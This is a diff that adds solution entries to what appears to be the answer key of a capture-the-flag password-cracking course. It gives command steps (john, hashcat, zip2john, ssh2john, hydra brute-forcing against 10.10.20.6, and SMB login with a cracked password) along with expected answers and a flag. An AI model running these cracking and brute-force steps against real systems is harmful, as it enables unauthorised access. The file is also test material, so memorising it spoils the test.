@@ -428,5 +428,74 @@
     "submit": {
       "o2": "/var/www/html/db.php"
     }
+  },
+  "c05-m01": {
+    "steps": [
+      "hashid 5f4dcc3b5aa765d61d8327deb882cf99"
+    ],
+    "submit": {
+      "o2": "sha1",
+      "o3": "ntlm"
+    }
+  },
+  "c05-m02": {
+    "steps": [
+      "cat ~/Documents/clients/acme-md5-dump.txt",
+      "john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou-mini.txt ~/Documents/clients/acme-md5-dump.txt"
+    ],
+    "submit": {
+      "o3": "password",
+      "o4": "qwerty"
+    }
+  },
+  "c05-m03": {
+    "steps": [
+      "cat ~/Documents/clients/acme-sha1-dump.txt",
+      "hashcat -m 100 -a 0 ~/Documents/clients/acme-sha1-dump.txt /usr/share/wordlists/rockyou-mini.txt"
+    ],
+    "submit": {
+      "o3": "welcome1",
+      "o4": "acme2024"
+    }
+  },
+  "c05-m04": {
+    "steps": [
+      "cat ~/Documents/clients/acme-ntlm-dump.txt",
+      "john --format=nt --wordlist=/usr/share/wordlists/rockyou-mini.txt ~/Documents/clients/acme-ntlm-dump.txt",
+      "smbclient -U hr_admin%Winter2024! //10.10.20.6/hr",
+      "get hr_audit_note.txt",
+      "exit",
+      "cat hr_audit_note.txt"
+    ],
+    "submit": {
+      "o3": "Winter2024!",
+      "o5": "FLAG{password_reuse_opens_every_door}"
+    }
+  },
+  "c05-m05": {
+    "steps": [
+      "zip2john ~/Documents/clients/backup.zip > backup.hash",
+      "john --wordlist=/usr/share/wordlists/rockyou-mini.txt backup.hash"
+    ],
+    "submit": {
+      "o3": "letmein"
+    }
+  },
+  "c05-m06": {
+    "steps": [
+      "ssh2john ~/Documents/clients/id_rsa_backup > key.hash",
+      "john --wordlist=/usr/share/wordlists/rockyou-mini.txt key.hash"
+    ],
+    "submit": {
+      "o3": "qwerty"
+    }
+  },
+  "c05-m07": {
+    "steps": [
+      "hydra -L ~/Documents/acme-users.txt -P /usr/share/wordlists/rockyou-mini.txt 10.10.20.6 ftp"
+    ],
+    "submit": {
+      "o3": "Summer2024!"
+    }
   }
 }
